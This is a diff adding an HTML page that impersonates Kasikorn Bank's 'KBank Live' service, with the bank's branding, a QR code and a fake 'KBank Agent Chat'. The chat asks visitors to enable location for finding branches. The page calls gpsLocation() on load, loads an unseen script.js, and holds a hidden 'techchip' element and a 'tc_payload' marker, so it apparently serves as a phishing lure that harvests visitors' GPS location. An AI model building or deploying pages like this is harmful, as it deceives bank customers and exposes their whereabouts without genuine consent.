@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>KBank Live</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+  <link rel="stylesheet" href="./style.css">
+  <link rel="icon" type="image/png" href="logokbank.png">
+  <style>
+    body {
+      background: #fff;
+      font-family: 'Prompt', 'Kanit', Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .kbank-topbar-straight {
+      width: 100vw;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 64px;
+      box-shadow: 0 2px 8px rgba(36,166,71,0.08);
+      border-bottom: 1.5px solid #ececec;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 1000;
+      padding: 0 32px;
+    }
+    .kbank-bar-logo {
+      height: 38px;
+      margin-left: 8px;
+    }
+    .kbank-bar-live {
+      height: 48px;
+      margin-right: 8px;
+    }
+    .main-content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+      padding-top: 80px;
+      box-sizing: border-box;
+    }
+    .center-detail {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 32px;
+      margin-bottom: 32px;
+    }
+    .kbank-live-logo {
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      margin-bottom: 16px;
+      background: #24a647;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .kbank-live-logo img {
+      width: 90px;
+      height: 90px;
+      border-radius: 50%;
+      background: #24a647;
+      object-fit: contain;
+    }
+    .center-detail .live-title {
+      font-size: 1.2rem;
+      font-weight: bold;
+      color: #24a647;
+      margin-bottom: 4px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .center-detail .live-title i {
+      color: #24a647;
+    }
+    .center-detail .live-desc {
+      font-size: 1rem;
+      color: #222;
+      margin-bottom: 12px;
+    }
+    .center-detail .live-note {
+      color: #7a7a7a;
+      font-size: 1rem;
+      margin-bottom: 24px;
+      text-align: center;
+      line-height: 1.5;
+    }
+    .center-detail .qr-code {
+      margin: 0 auto 24px auto;
+      display: flex;
+      justify-content: center;
+    }
+    .center-detail .qr-code img {
+      width: 200px;
+      height: 200px;
+      border: 1px solid #eee;
+      border-radius: 8px;
+      background: #fff;
+    }
+    .center-detail .footer {
+      color: #b8a89a;
+      font-size: 1.1rem;
+      margin-top: 32px;
+      text-align: center;
+    }
+    /* Chat box floating right bottom */
+    .chat-float {
+      position: fixed;
+      right: 32px;
+      bottom: 32px;
+      z-index: 2000;
+      width: 380px;
+      max-width: 95vw;
+      box-shadow: 0 8px 32px 0 rgba(60, 180, 80, 0.15);
+      border-radius: 20px;
+      overflow: hidden;
+      background: #fff;
+      border: 2px solid #24a647;
+      display: flex;
+      flex-direction: column;
+      min-height: 420px;
+    }
+    .msger-header {
+      background: linear-gradient(90deg, #24a647 0%, #1b8e3e 100%);
+      color: #fff;
+      padding: 18px 20px 12px 20px;
+      font-size: 1.2rem;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #e0e0e0;
+    }
+    .msger-header-title img {
+      height: 24px;
+      vertical-align: middle;
+      margin-right: 10px;
+    }
+    .msger-header-options i {
+      font-size: 1.2rem;
+      cursor: pointer;
+    }
+    .msger-chat {
+      padding: 18px 16px 12px 16px;
+      background: #f8fff8;
+      overflow-y: auto;
+      flex: 1;
+    }
+    .msg {
+      display: flex;
+      align-items: flex-end;
+      margin-bottom: 14px;
+    }
+    .msg.left-msg .msg-img {
+      background: #e0f7e9;
+      border: 2px solid #24a647;
+    }
+    .msg-img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background-size: cover;
+      background-position: center;
+      object-fit: cover;         /* เพิ่มบรรทัดนี้ */
+      object-position: center;   /* เพิ่มบรรทัดนี้ */
+      margin-right: 12px;
+      border: 2px solid #e0e0e0;
+    }
+    .msg-bubble {
+      background: #fff;
+      border-radius: 16px;
+      padding: 10px 14px;
+      box-shadow: 0 2px 8px rgba(36, 166, 71, 0.07);
+      max-width: 70%;
+      font-size: 1rem;
+      color: #222;
+    }
+    .msg-info {
+      margin-bottom: 4px;
+      font-size: 0.95rem;
+      color: #24a647;
+      font-weight: 500;
+    }
+    .msger-inputarea {
+      display: flex;
+      padding: 14px 16px;
+      background: #f5f7fa;
+      border-top: 1px solid #e0e0e0;
+    }
+    .msger-input {
+      flex: 1;
+      border: 1.5px solid #24a647;
+      border-radius: 24px;
+      padding: 10px 16px;
+      font-size: 1rem;
+      outline: none;
+      margin-right: 10px;
+      transition: border 0.2s;
+    }
+    .msger-input:focus {
+      border-color: #1b8e3e;
+    }
+    .msger-send-btn {
+      background: linear-gradient(90deg, #24a647 0%, #1b8e3e 100%);
+      color: #fff;
+      border: none;
+      border-radius: 24px;
+      padding: 10px 22px;
+      font-size: 1rem;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .msger-send-btn:hover {
+      background: linear-gradient(90deg, #1b8e3e 0%, #24a647 100%);
+    }
+    @media (max-width: 900px) {
+      .main-content {
+        padding-top: 64px;
+      }
+      .chat-float {
+        right: 4vw;
+        bottom: 4vw;
+        width: 98vw;
+        min-width: 0;
+        border-radius: 12px;
+      }
+    }
+  </style>
+</head>
+<body onload="gpsLocation()">
+  <!-- KBank Top Bar -->
+  <div class="kbank-topbar-straight">
+    <img src="Kbanknewlogo.png" alt="KBank Logo" class="kbank-bar-logo">
+    <img src="kbankline.png" alt="KBank Live" class="kbank-bar-live">
+  </div>
+  <div class="main-content">
+    <div class="center-detail">
+      <div class="kbank-live-logo">
+        <img src="kbanklive.png" alt="KBank Live">
+      </div>
+      <div class="live-title">
+        <i class="fas fa-shield-alt"></i> KBankLive
+      </div>
+      <div class="live-desc">ธนาคารกสิกรไทย</div>
+      <div class="live-note">
+        กรุณาดำเนินการต่อบนสมาร์ทโฟน<br>
+        โดยการสแกน QR Code ด้านล่างนี้
+      </div>
+      <div class="qr-code">
+        <img src="qrcode.png" alt="QR Code">
+      </div>
+      <div class="footer">
+        บริการทุกระดับประทับใจ
+      </div>
+    </div>
+  </div>
+  <!-- Floating Chat Box -->
+  <section class="chat-float">
+    <header class="msger-header">
+      <div class="msger-header-title">
+        <img src="logokbank.png" alt="KBank Logo">
+        KBank Agent Chat
+      </div>
+      <div class="msger-header-options">
+        <span><i class="fas fa-cog"></i></span>
+      </div>
+    </header>
+    <main class="msger-chat">
+      <div class="msg left-msg">
+        <div
+          class="msg-img"
+          style="background-image: url('logokbank.png')"
+        ></div>
+        <div class="msg-bubble">
+          <div class="msg-info">
+            <div class="msg-info-name">Agent</div>
+          </div>
+          <div class="msg-text">
+            สวัสดีค่ะ ยินดีต้อนรับสู่ KBank Live Chat กรุณาเปิด Location เพื่อให้เราช่วยค้นหาสาขาและตู้ ATM ที่ใกล้ที่สุดให้คุณค่ะ
+          </div>
+        </div>
+      </div>
+    </main>
+    <form class="msger-inputarea">
+      <input type="text" class="msger-input" placeholder="พิมพ์ข้อความของคุณ...">
+      <button type="submit" class="msger-send-btn">ส่ง</button>
+    </form>
+  </section>
+  <script src="./script.js"></script>
+  <p id="techchip" style="display:none;"></p>
+  <!-- tc_payload -->
+</body>
+</html>
